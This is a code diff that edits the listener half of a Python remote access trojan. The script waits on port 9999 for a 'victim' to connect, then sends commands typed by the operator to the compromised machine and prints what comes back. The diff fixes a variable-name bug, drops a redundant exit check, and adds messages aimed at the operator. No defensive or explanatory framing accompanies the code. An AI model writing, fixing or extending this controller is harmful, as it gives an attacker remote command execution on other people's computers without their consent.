@@ -12,8 +12,9 @@ LISTEN_IP = '0.0.0.0'
 PORT = 9999
 
 def main():
-    if os.name == 'nt':
-        print("[!] Warning: Running on Windows. Firewall may block incoming connections.")
+    print("--- RAT Server Started ---")
+    print("Waiting for victim to connect...")
+    print("NOTE: If connected, the client terminal will now echo commands you type here.")
     
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -21,30 +22,27 @@ def main():
     try:
         server.bind((LISTEN_IP, PORT))
         server.listen(1)
-        print(f"[*] Listening on {LIST_IP}:{PORT}")
-        print("[*] Waiting for connection...")
+        print(f"[*] Listening on {LISTEN_IP}:{PORT}")
     except Exception as e:
         print(f"[!] Failed to bind: {e}")
-        print("[!] Ensure no other program is using port 9999 and check firewall settings.")
         sys.exit(1)
 
     client, addr = server.accept()
     print(f"[+] Connection received from {addr}")
+    print("[*] You are now connected. Try typing 'whoami' or 'dir'.")
 
     while True:
         try:
-            cmd = input("# ")
+            cmd = input("\n# Command: ")
             if cmd.lower() == 'exit':
                 client.send('exit'.encode())
                 break
             
             client.send(cmd.encode())
             
-            if cmd.lower() == 'exit':
-                break
-                
             result = client.recv(4096)
             if result:
+                print("[Response from client]:")
                 print(result.decode())
             else:
                 print("[!] Connection closed by remote host.")
